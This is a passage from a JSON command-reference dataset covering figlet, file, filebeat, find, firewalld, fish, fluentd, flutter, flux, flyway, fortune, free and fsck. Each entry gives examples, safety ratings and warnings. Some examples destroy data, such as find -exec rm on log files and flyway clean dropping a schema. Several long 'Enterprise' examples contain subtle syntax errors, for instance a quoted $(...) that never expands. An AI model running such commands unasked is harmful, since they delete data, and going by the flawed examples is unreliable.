      "figlet -f big '$(echo $COMPANY_NAME | tr '[:lower:]' '[:upper:]')' && echo '' && figlet -f small 'Production Environment' && echo '' && printf 'Server: %s | Environment: %s | Date: %s\n' \"$(hostname)\" \"$ENVIRONMENT\" \"$(date +'%Y-%m-%d %H:%M:%S')\" && echo 'System Status:' && systemctl is-active --quiet nginx && echo '✓ Web Server: Running' || echo '✗ Web Server: Down' && echo 'Enterprise system welcome banner: corporate branding, environment identification, server details, and critical service status for production system access and monitoring'  # Enterprise system welcome banner with status"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "figlet [options] [text]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Script header",
        "commands": "figlet 'MyScript' && echo 'Version 1.0' && echo ''",
        "explanation": "Create attractive script header with version info",
        "title": "figlet && echo && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "toilet",
        "relationship": "alternative",
        "reason": "toilet provides similar ASCII art with color support"
      },
      {
        "name": "banner",
        "relationship": "similar",
        "reason": "banner creates simpler text banners"
      }
    ],
    "warnings": [
      "Many font files available for different styles",
      "Useful for script headers and system messages",
      "Output width can be controlled for different terminals"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://www.figlet.org/"
      },
      {
        "platform": "macos",
        "url": "http://www.figlet.org/"
      },
      {
        "platform": "windows",
        "url": "http://www.figlet.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "file",
    "subtitle": "file",
    "description": "Determine file type and format",
    "examples": [
      "file document.pdf  # Determine file format regardless of extension",
      "file *  # Show file types for all files in directory",
      "file -b image.jpg  # Show only file type without filename",
      "file -L symlink  # Check type of link target, not the link",
      "file -i script.py  # Show MIME type and encoding",
      "find . -type f -exec file {} \\; | grep -E 'executable|script'  # Find all executable files",
      "file -z compressed.gz  # Look inside compressed files to identify content",
      "find /enterprise/uploads -type f -exec file -i {} \; | grep -E '(executable|script|application)' | while read filepath; do echo \"SECURITY ALERT: $filepath\"; file \"$(echo $filepath | cut -d: -f1)\"; sha256sum \"$(echo $filepath | cut -d: -f1)\"; done && find /enterprise/uploads -name '*.exe' -o -name '*.bat' -o -name '*.sh' -exec ls -la {} \; && echo 'Enterprise security file analysis: executable detection, script identification, malware screening, cryptographic checksums, and comprehensive upload validation for enterprise security compliance'  # Enterprise file security validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "file [options] <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find binary files in directory",
        "commands": "file * | grep -v text | grep -v directory",
        "explanation": "Identify non-text files in current directory",
        "title": "file | grep | grep"
      },
      {
        "scenario": "Verify file integrity",
        "commands": "file suspicious.exe && hexdump -C suspicious.exe | head",
        "explanation": "Check file type and examine binary content",
        "title": "file && hexdump | head"
      }
    ],
    "relatedCommands": [
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "ls shows file names, file shows their types"
      },
      {
        "name": "stat",
        "relationship": "combo",
        "reason": "stat shows metadata, file shows content type"
      },
      {
        "name": "hexdump",
        "relationship": "combo",
        "reason": "Examine binary file contents"
      }
    ],
    "warnings": [
      "file command relies on file signatures, not extensions",
      "May not detect some custom or obscure file formats",
      "Results can vary between different versions of the file command"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/file.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/file.html"
      },
      {
        "platform": "generic",
        "url": "https://www.darwinsys.com/file/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "filebeat",
    "subtitle": "Filebeat Log Shipper",
    "description": "Lightweight shipper for forwarding and centralizing log data",
    "examples": [
      "filebeat -e  # Run Filebeat with logging to stderr",
      "filebeat -c filebeat.yml  # Run with custom configuration file",
      "filebeat test config  # Test configuration file validity",
      "filebeat test output  # Test connection to configured outputs",
      "filebeat setup --index-management  # Setup Elasticsearch index template",
      "filebeat modules enable nginx  # Enable built-in Nginx log parsing module",
      "filebeat export config  # Display current configuration for debugging",
      "filebeat test config && filebeat test output && systemctl is-active filebeat && filebeat export config | jq '.filebeat.inputs[] | {type: .type, paths: .paths, multiline: .multiline}' && tail -20 /var/log/filebeat/filebeat && echo 'Enterprise log monitoring validation: configuration verification, output connectivity testing, service health check, input source analysis, and recent log shipping verification for production observability infrastructure'  # Enterprise Filebeat monitoring and validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "filebeat [command] [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Full Elasticsearch setup",
        "commands": "filebeat setup && filebeat -e",
        "explanation": "Setup dashboards and templates, then run Filebeat",
        "title": "filebeat && filebeat"
      }
    ],
    "relatedCommands": [
      {
        "name": "elasticsearch",
        "relationship": "combo",
        "reason": "Filebeat commonly ships logs to Elasticsearch"
      },
      {
        "name": "logstash",
        "relationship": "alternative",
        "reason": "Both handle log processing, Filebeat is lighter"
      }
    ],
    "warnings": [
      "Requires write permissions to log files",
      "Registry file tracks reading positions",
      "Modules must be enabled separately"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.elastic.co/guide/en/beats/filebeat/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "find",
    "subtitle": "find",
    "description": "Search for files and directories based on criteria",
    "examples": [
      "find . -name '*.js'  # Locate all JavaScript files in current directory and subdirectories",
      "find /home -mtime -7  # Show files changed within the past week",
      "find . -size +100M  # Locate files larger than 100 megabytes",
      "find . -name '*.log' -exec rm {} \\;  # Find log files and delete them",
      "find . -type d -name 'node_modules'  # Locate all node_modules directories",
      "find . -type f -perm 755  # Find all executable files with specific permissions",
      "find /var/log -name '*.log' -mtime +30 -exec gzip {} \\;  # Compress old log files",
      "find /enterprise/data -type f -size +100M -mtime +7 -exec sh -c 'echo \"Archiving large file: $1 ($(ls -lh \"$1\" | awk \\\"{print \\\\$5}\\\"))\"; tar -czf \\\"/archive/$(basename \"$1\" .log)-$(date +%Y%m%d).tar.gz\\\" \"$1\" && rm \"$1\" && echo \"Archived and cleaned: $1\"' _ {} \; && du -sh /archive/* | sort -hr && echo 'Enterprise data lifecycle management: automated large file identification, timestamped archival with compression, storage optimization, and audit trail for compliance and cost management'  # Enterprise data archival and cleanup automation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "dangerous",
    "syntaxPattern": "find <path> [expression]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and count files by type",
        "commands": "find . -name '*.py' | wc -l",
        "explanation": "Count total number of Python files",
        "title": "find | wc"
      },
      {
        "scenario": "Find files and show their sizes",
        "commands": "find . -name '*.pdf' -exec ls -lh {} \\; | sort -k5 -nr",
        "explanation": "Find PDF files, show sizes, sort by largest first",
        "title": "find ; | sort"
      }
    ],
    "relatedCommands": [
      {
        "name": "fd",
        "relationship": "alternative",
        "reason": "Modern, faster alternative with simpler syntax"
      },
      {
        "name": "locate",
        "relationship": "similar",
        "reason": "Faster search using pre-built database"
      },
      {
        "name": "grep",
        "relationship": "combo",
        "reason": "Find files then search within them for content"
      }
    ],
    "warnings": [
      "find can be slow on large filesystems",
      "Wildcards in -name must be quoted to prevent shell expansion",
      "-exec requires \\; or + terminator"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/find.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/find.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/findutils/manual/html_mono/find.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "firewalld",
    "subtitle": "Firewall Daemon",
    "description": "Dynamic firewall management daemon with zones",
    "examples": [
      "firewall-cmd --state  # Check if firewalld is running",
      "firewall-cmd --get-active-zones  # Show currently active firewall zones",
      "sudo firewall-cmd --add-service=http  # Allow HTTP service in default zone (temporary)",
      "sudo firewall-cmd --permanent --add-service=http  # Permanently allow HTTP service",
      "sudo firewall-cmd --permanent --add-port=8080/tcp  # Permanently open port 8080 for TCP",
      "sudo firewall-cmd --reload  # Reload permanent configuration",
      "sudo firewall-cmd --list-all  # Show complete configuration for default zone",
      "sudo firewall-cmd --list-all-zones | grep -A 10 -E '(public|dmz|internal|work)' && sudo firewall-cmd --permanent --add-rich-rule='rule family=\"ipv4\" source address=\"10.0.0.0/8\" service name=\"ssh\" accept' && sudo firewall-cmd --permanent --add-rich-rule='rule family=\"ipv4\" source address=\"192.168.0.0/16\" port port=\"443\" protocol=\"tcp\" accept' && sudo firewall-cmd --reload && sudo firewall-cmd --list-rich-rules && echo 'Enterprise firewall configuration: zone-based security policies, rich rule implementation for granular access control, corporate network segmentation, and comprehensive security posture management for production infrastructure'  # Enterprise network security configuration"
    ],
    "platform": [
      "linux"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "firewall-cmd [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web server configuration",
        "commands": "sudo firewall-cmd --permanent --add-service=http && sudo firewall-cmd --permanent --add-service=https && sudo firewall-cmd --reload",
        "explanation": "Add HTTP and HTTPS services permanently then reload",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "iptables",
        "relationship": "alternative",
        "reason": "firewalld manages iptables rules"
      }
    ],
    "warnings": [
      "Changes need --reload to take effect",
      "Temporary vs permanent rule distinction"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://firewalld.org/documentation/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fish",
    "subtitle": "Friendly Interactive Shell",
    "description": "Friendly interactive shell with smart features",
    "examples": [
      "fish  # Launch fish interactive session",
      "fish script.fish  # Execute fish shell script",
      "fish_config  # Open fish configuration in web browser",
      "fish --version  # Display fish shell version",
      "fish -c 'echo $PWD'  # Execute single command and exit",
      "fish --no-config  # Start fish without loading configuration files",
      "fish -P  # Start fish in private mode without history",
      "fish -c 'set -gx COMPANY_ENV production; set -gx LOG_LEVEL info; set -gx MONITORING_URL https://monitoring.company.com; echo \"Enterprise Fish Shell Environment\"; echo \"Environment: $COMPANY_ENV\"; echo \"Log Level: $LOG_LEVEL\"; echo \"Monitoring: $MONITORING_URL\"; functions --names | grep -E \"(deploy|monitor|backup)\" | head -10' && fish_config browse && echo 'Enterprise shell environment: production configuration, logging standards, monitoring integration, deployment function availability, and interactive configuration management for enterprise development workflows'  # Enterprise Fish shell environment setup"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "fish [options] [script] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Fish shell setup",
        "commands": "fish --version && fish_config",
        "explanation": "Check version then open configuration interface",
        "title": "fish && fish_config"
      }
    ],
    "relatedCommands": [
      {
        "name": "bash",
        "relationship": "alternative",
        "reason": "Traditional shell alternative"
      },
      {
        "name": "zsh",
        "relationship": "alternative",
        "reason": "Another advanced shell option"
      }
    ],
    "warnings": [
      "Different syntax from bash/zsh",
      "Not POSIX-compliant by design"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://fishshell.com/docs/current/"
      },
      {
        "platform": "macos",
        "url": "https://fishshell.com/docs/current/"
      },
      {
        "platform": "windows",
        "url": "https://fishshell.com/docs/current/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fluentd",
    "subtitle": "Fluent Daemon",
    "description": "Unified logging layer for collecting and routing log data",
    "examples": [
      "fluentd -c fluent.conf  # Run Fluentd with specific configuration",
      "fluentd -c fluent.conf -v  # Run with verbose logging for debugging",
      "fluentd -c fluent.conf --dry-run  # Test configuration without actually running",
      "fluentd -c fluent.conf -d /var/run/fluentd.pid  # Run as daemon with PID file",
      "fluentd -c fluent.conf --suppress-repeated-stacktrace  # Run with cleaner error output",
      "fluentd --setup /etc/fluent  # Create initial configuration directory",
      "fluentd -p /usr/local/lib/fluentd/plugins  # Run with custom plugin directory",
      "fluentd -c /etc/fluentd/production.conf --suppress-repeated-stacktrace -o /var/log/fluentd/fluentd.log && sleep 5 && curl -s http://localhost:24220/api/plugins.json | jq '.plugins[] | {type: .type, plugin_id: .plugin_id, output_plugin: .output_plugin}' && tail -20 /var/log/fluentd/fluentd.log && ps aux | grep fluentd && echo 'Enterprise log aggregation: production configuration deployment, plugin status verification, health monitoring, process validation, and comprehensive logging infrastructure for enterprise observability and compliance'  # Enterprise Fluentd production monitoring"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "fluentd [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production setup with logging",
        "commands": "fluentd -c fluent.conf -o /var/log/fluentd.log -d /var/run/fluentd.pid",
        "explanation": "Production daemon with log file and PID",
        "title": "fluentd"
      }
    ],
    "relatedCommands": [
      {
        "name": "td-agent",
        "relationship": "package",
        "reason": "td-agent is stable distribution of Fluentd"
      },
      {
        "name": "fluent-bit",
        "relationship": "alternative",
        "reason": "Fluent Bit is lightweight alternative to Fluentd"
      }
    ],
    "warnings": [
      "Ruby-based, requires Ruby runtime",
      "Plugin system can be complex",
      "Memory usage can grow with buffer sizes"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.fluentd.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "flutter",
    "subtitle": "Flutter",
    "description": "Flutter SDK for building natively compiled applications",
    "examples": [
      "flutter create myapp  # Creates a new Flutter project with default template and structure",
      "flutter run  # Builds and runs the Flutter app on the connected device or emulator",
      "flutter build apk  # Creates a release APK file for Android distribution",
      "flutter build ios  # Builds the iOS app for release or testing",
      "flutter clean && flutter pub get && flutter analyze && flutter test && flutter build appbundle --release --build-name=\"$(git describe --tags)\" --build-number=\"$(git rev-list --count HEAD)\" && flutter build ios --release --build-name=\"$(git describe --tags)\" --build-number=\"$(git rev-list --count HEAD)\" && fastlane beta deploy:internal && echo 'Enterprise Flutter deployment pipeline: dependency management, static analysis, automated testing, semantic versioning, multi-platform builds, and automated distribution for enterprise mobile application delivery'  # Enterprise Flutter CI/CD pipeline",
      "flutter doctor  # Diagnoses Flutter installation and shows missing dependencies or configuration issues"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "flutter [command] [options]",
    "prerequisites": [
      "dart-sdk",
      "android-sdk"
    ],
    "commandCombinations": [
      {
        "scenario": "Create and run new Flutter app",
        "commands": "flutter create myapp && cd myapp && flutter run",
        "explanation": "Creates new Flutter project, navigates into it, and runs on connected device",
        "title": "flutter && cd && flutter"
      },
      {
        "scenario": "Build for multiple platforms",
        "commands": "flutter build apk && flutter build ios",
        "explanation": "Builds release versions for both Android and iOS platforms",
        "title": "flutter && flutter"
      }
    ],
    "relatedCommands": [
      {
        "name": "dart",
        "relationship": "dependency",
        "reason": "Programming language and runtime used by Flutter"
      },
      {
        "name": "flutter pub",
        "relationship": "subcommand",
        "reason": "Package manager for Flutter dependencies"
      },
      {
        "name": "react-native",
        "relationship": "competitor",
        "reason": "Alternative cross-platform mobile framework using JavaScript"
      }
    ],
    "warnings": [
      "iOS development requires macOS with Xcode",
      "Android development needs Android SDK and proper setup",
      "Hot reload may not work for all code changes",
      "Large app size compared to native apps"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.flutter.dev/get-started/install/linux"
      },
      {
        "platform": "macos",
        "url": "https://docs.flutter.dev/get-started/install/macos"
      },
      {
        "platform": "windows",
        "url": "https://docs.flutter.dev/get-started/install/windows"
      },
      {
        "platform": "generic",
        "url": "https://docs.flutter.dev/get-started/install"
      }
    ],
    "distroNotes": {
      "linux": "Android development supported, iOS development not available",
      "windows": "Android and Windows desktop development supported",
      "macos": "Full iOS, Android, and macOS development supported"
    }
  },
  {
    "name": "flux",
    "subtitle": "Flux v2",
    "description": "GitOps toolkit for Kubernetes (Flux v2)",
    "examples": [
      "flux bootstrap github --owner=myuser --repository=fleet-infra --branch=main --path=./clusters/my-cluster --personal  # Install Flux and configure Git repository for GitOps",
      "flux check  # Verify Flux installation and component health",
      "flux create source git webapp --url=https://github.com/user/webapp --branch=main --interval=30s  # Create Git source for application manifests",
      "flux create kustomization webapp --target-namespace=default --source=webapp --path='./deploy' --prune=true --interval=5m  # Create Kustomization to deploy application from Git source",
      "flux reconcile source git webapp  # Force immediate reconciliation of Git source",
      "flux get all  # List all Flux resources and their status",
      "flux suspend kustomization webapp  # Temporarily stop automated deployments",
      "flux resume kustomization webapp  # Re-enable automated deployments",
      "flux bootstrap github --owner=enterprise-org --repository=k8s-fleet-management --branch=main --path=clusters/production --personal=false --team=platform-engineering && flux create source git enterprise-apps --url=https://github.com/enterprise-org/applications --branch=main --secret-ref=git-auth && flux create kustomization production-apps --source=enterprise-apps --path='./environments/production' --target-namespace=production --prune=true --interval=5m && kubectl get gitrepository,kustomization -A && echo 'Enterprise GitOps infrastructure: organizational Git integration, team-based access control, multi-environment application deployment, automated reconciliation, and comprehensive cluster management for enterprise Kubernetes operations'  # Enterprise GitOps cluster management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "flux [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete GitOps setup",
        "commands": "flux check --pre && flux bootstrap github --owner=myorg --repository=fleet-infra --branch=main --path=clusters/production",
        "explanation": "Check prerequisites and bootstrap Flux with GitHub",
        "title": "flux && flux"
      },
      {
        "scenario": "Application deployment setup",
        "commands": "flux create source git myapp --url=https://github.com/user/myapp --branch=main && flux create kustomization myapp --source=myapp --path='./k8s' --target-namespace=production",
        "explanation": "Create Git source and Kustomization for application deployment",
        "title": "flux && flux"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Flux v2 extends Kubernetes with custom resources"
      },
      {
        "name": "kustomize",
        "relationship": "combo",
        "reason": "Flux v2 uses Kustomize for manifest transformations"
      }
    ],
    "warnings": [
      "Flux v2 is complete rewrite of Flux v1 with different architecture",
      "Git repository structure important for proper source detection",
      "RBAC permissions required for cross-namespace deployments",
      "Image automation requires separate image reflector and automation controllers"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://fluxcd.io/flux/cmd/"
      },
      {
        "platform": "macos",
        "url": "https://fluxcd.io/flux/cmd/"
      },
      {
        "platform": "windows",
        "url": "https://fluxcd.io/flux/cmd/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fluxctl",
    "subtitle": "Flux Control",
    "description": "GitOps toolkit for continuous delivery to Kubernetes",
    "examples": [
      "fluxctl list-workloads  # Show all workloads managed by Flux",
      "fluxctl sync --k8s-fwd-ns flux-system  # Force synchronization with Git repository",
      "fluxctl list-workloads --k8s-fwd-ns=flux && fluxctl list-images --k8s-fwd-ns=flux | grep -E '(production|staging)' && fluxctl automate --k8s-fwd-ns=flux --workload=production:deployment/web-app && kubectl get pods -n production -o wide && kubectl get events -n production --sort-by='.lastTimestamp' | tail -10 && echo 'Enterprise Flux v1 operations: workload inventory, image tracking across environments, automated deployment policies, production service validation, and event monitoring for legacy GitOps cluster management'  # Enterprise Flux v1 deployment monitoring",
      "fluxctl release --workload=default:deployment/myapp --update-image=myapp:v2.0.0  # Update application to new container image version",
      "fluxctl sync-status  # Display current synchronization status",
      "fluxctl lock --workload=default:deployment/myapp  # Prevent automated updates for specific workload",
      "fluxctl unlock --workload=default:deployment/myapp  # Re-enable automated updates for workload",
      "fluxctl list-images --workload=default:deployment/myapp  # Show available container image versions",
      "fluxctl automate --workload=default:deployment/myapp  # Enable automated deployments for workload"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "fluxctl [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Emergency deployment workflow",
        "commands": "fluxctl release --workload=default:deployment/myapp --update-image=myapp:hotfix-v1.2.1 && fluxctl sync",
        "explanation": "Deploy hotfix image and force Git synchronization",
        "title": "fluxctl && fluxctl"
      },
      {
        "scenario": "Maintenance mode",
        "commands": "fluxctl list-workloads | grep myapp | xargs fluxctl lock",
        "explanation": "Lock all workloads matching pattern to prevent updates",
        "title": "fluxctl | grep | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Flux operates on Kubernetes using kubectl"
      },
      {
        "name": "git",
        "relationship": "combo",
        "reason": "Flux synchronizes with Git repositories"
      }
    ],
    "warnings": [
      "Flux v2 uses different CLI (flux) than Flux v1 (fluxctl)",
      "Git repository must be accessible from cluster",
      "Automated deployments follow semver policies",
      "Image scanning requires registry access configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://fluxcd.io/legacy/flux/references/fluxctl/"
      },
      {
        "platform": "macos",
        "url": "https://fluxcd.io/legacy/flux/references/fluxctl/"
      },
      {
        "platform": "windows",
        "url": "https://fluxcd.io/legacy/flux/references/fluxctl/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "flyway",
    "subtitle": "Flyway",
    "description": "Database migration tool for version control and deployment",
    "examples": [
      "flyway -url=jdbc:postgresql://localhost/mydb -user=dbuser -password=secret migrate  # Apply all pending migrations to database",
      "flyway -url=jdbc:mysql://localhost/mydb -user=root -password=secret info  # Display current migration status and pending migrations",
      "flyway -url=jdbc:postgresql://localhost/mydb -user=dbuser -password=secret validate  # Validate applied migrations against available ones",
      "flyway -url=jdbc:postgresql://localhost/mydb -user=dbuser -password=secret -baselineVersion=1.0 baseline  # Initialize migration tracking for existing database",
      "flyway -url=jdbc:postgresql://localhost/testdb -user=testuser -password=test clean  # Drop all objects in database schema",
      "flyway -url=jdbc:postgresql://localhost/mydb -user=dbuser -password=secret repair  # Fix migration metadata issues",
      "flyway -configFiles=flyway.conf migrate  # Run migration using configuration file",
      "flyway -url=jdbc:postgresql://prod-db.company.com:5432/enterprise_app -user=flyway_user -password=$DB_PASSWORD -locations=filesystem:./migrations/production validate && flyway migrate && flyway info && psql -h prod-db.company.com -U app_user -d enterprise_app -c 'SELECT version, installed_by, installed_on, description FROM flyway_schema_history ORDER BY installed_rank DESC LIMIT 5;' && echo 'Enterprise database deployment: schema validation, automated migration execution, status verification, and audit trail for production database lifecycle management and compliance tracking'  # Enterprise database migration pipeline"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "flyway [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "CI/CD deployment pipeline",
        "commands": "flyway info && flyway validate && flyway migrate && flyway info",
        "explanation": "Check status, validate, migrate, then confirm results",
        "title": "flyway && flyway && flyway && flyway"
      }
    ],
    "relatedCommands": [
      {
        "name": "liquibase",
        "relationship": "alternative",
        "reason": "Alternative database migration tool"
      },
      {
        "name": "alembic",
        "relationship": "alternative",
        "reason": "Python-based database migration tool"
      }
    ],
    "warnings": [
      "Clean command permanently deletes all data",
      "Migration files must follow naming convention (V1__Description.sql)",
      "Checksums prevent accidental migration changes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://flywaydb.org/documentation/"
      },
      {
        "platform": "macos",
        "url": "https://flywaydb.org/documentation/"
      },
      {
        "platform": "windows",
        "url": "https://flywaydb.org/documentation/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fortune",
    "subtitle": "Fortune",
    "description": "Display random quotations and sayings",
    "examples": [
      "fortune  # Display random fortune cookie message",
      "fortune -s  # Display only short fortune messages",
      "fortune -l  # Display only long fortune messages",
      "fortune computers  # Display fortune from computer-related quotes",
      "fortune -f  # Show all available fortune files",
      "fortune -n 100  # Display fortunes with at most 100 characters",
      "fortune -a  # Choose from all fortune files including potentially offensive ones",
      "echo '=== Daily Enterprise Motivation ===' && fortune computers | cowsay -f tux && echo '' && echo 'System Status:' && uptime | awk '{print \"Load Average: \" $10 $11 $12}' && free -h | grep Mem | awk '{print \"Memory Usage: \" $3 \"/\" $2}' && df -h / | tail -1 | awk '{print \"Disk Usage: \" $5 \" of \" $2}' && echo 'Enterprise daily briefing: motivational tech wisdom, system performance metrics, and infrastructure health monitoring for productive team engagement'  # Enterprise daily system briefing with motivation"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "fortune [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Daily motivation",
        "commands": "echo '=== Fortune of the Day ===' && fortune && echo ''",
        "explanation": "Display formatted daily fortune message",
        "title": "echo && fortune && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "cowsay",
        "relationship": "combo",
        "reason": "fortune | cowsay creates speaking cow with fortune"
      }
    ],
    "warnings": [
      "May not be installed by default",
      "Fortune files located in /usr/share/games/fortunes/",
      "Can be added to shell startup for daily quotes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man6/fortune.6.html"
      },
      {
        "platform": "macos",
        "url": "Install via homebrew: brew install fortune"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "free",
    "subtitle": "free memory",
    "description": "Display memory usage information",
    "examples": [
      "free -h  # Show memory usage in KB, MB, GB units",
      "free -h -s 2  # Update memory display every 2 seconds",
      "free -m  # Display all memory values in megabytes",
      "free -t  # Add total line showing sum of physical and swap memory",
      "free -h -c 5  # Display memory usage 5 times then exit",
      "free -w  # Show wide output with separate buffers and cache columns",
      "watch -n 1 'free -h'  # Continuously monitor memory usage every second",
      "while true; do clear; echo '=== Enterprise Memory Monitoring Dashboard ===' && echo \"Timestamp: $(date)\" && free -h && echo '' && echo 'Memory Alert Thresholds:' && free | awk 'NR==2 {total=$2; avail=$7; used_pct=(total-avail)/total*100; if(used_pct>85) print \"🔴 CRITICAL: Memory usage at \" used_pct \"%\"; else if(used_pct>75) print \"🟡 WARNING: Memory usage at \" used_pct \"%\"; else print \"🟢 NORMAL: Memory usage at \" used_pct \"%\"}' && echo '' && ps aux --sort=-%mem | head -6 && sleep 30; done  # Enterprise memory monitoring with alerting and top processes"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "free [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Check for memory leaks",
        "commands": "while true; do free -h | grep Mem | awk '{print strftime(\"%Y-%m-%d %H:%M:%S\"), \"Used:\", $3, \"Available:\", $7}'; sleep 60; done",
        "explanation": "Monitor memory usage every minute with timestamps",
        "title": "while ; do | grep | awk ; sleep ; done"
      },
      {
        "scenario": "Alert on low memory",
        "commands": "free | awk 'NR==2{if($7<1000000) print \"Warning: Available memory below 1GB\"}'",
        "explanation": "Check if available memory is below threshold",
        "title": "free | awk < 1000000"
      }
    ],
    "relatedCommands": [
      {
        "name": "vmstat",
        "relationship": "comprehensive",
        "reason": "Shows memory stats along with CPU and I/O"
      },
      {
        "name": "top",
        "relationship": "interactive",
        "reason": "Interactive memory monitoring with process details"
      },
      {
        "name": "cat /proc/meminfo",
        "relationship": "detailed",
        "reason": "Raw detailed memory information from kernel"
      }
    ],
    "warnings": [
      "Linux-specific command, not available on macOS",
      "Available memory is more important than free memory on modern systems",
      "Cache and buffers are counted as used but are reclaimable"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/free.1.html"
      },
      {
        "platform": "generic",
        "url": "https://gitlab.com/procps-ng/procps"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fsck",
    "subtitle": "File System Check",
    "description": "Check and repair filesystem consistency",
    "examples": [
      "sudo fsck /dev/sdb1  # Check filesystem on device for errors",
      "sudo fsck -y /dev/sdb1  # Automatically fix minor filesystem errors",
      "sudo fsck -A  # Check all filesystems listed in /etc/fstab",
      "sudo fsck -f /dev/sdb1  # Force check even if filesystem appears clean",
      "fsck -n /dev/sdb1  # Check filesystem read-only without making repairs",
      "sudo fsck -v /dev/sdb1  # Check with verbose output showing progress",
      "echo 'Enterprise Filesystem Health Check' && for device in $(lsblk -ndo NAME,FSTYPE | grep -E 'ext[234]|xfs' | awk '{print \"/dev/\" $1}'); do echo \"Checking $device...\"; sudo fsck -n \"$device\" 2>&1 | grep -E '(error|clean|corrupt)' && echo \"$device: $(tune2fs -l \"$device\" 2>/dev/null | grep 'Last checked' | cut -d: -f2-)\"; done && echo 'RAID Status:' && cat /proc/mdstat 2>/dev/null | grep -E 'active|failed' && echo 'Enterprise storage infrastructure validation: automated filesystem integrity verification, metadata analysis, and RAID health monitoring for data protection and system reliability'  # Enterprise storage health monitoring"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "fsck [options] device",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe filesystem repair",
        "commands": "sudo umount /dev/sdb1 && sudo fsck -y /dev/sdb1 && sudo mount /dev/sdb1 /mnt/data",
        "explanation": "Unmount, check and repair, then remount filesystem",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "e2fsck",
        "relationship": "specific",
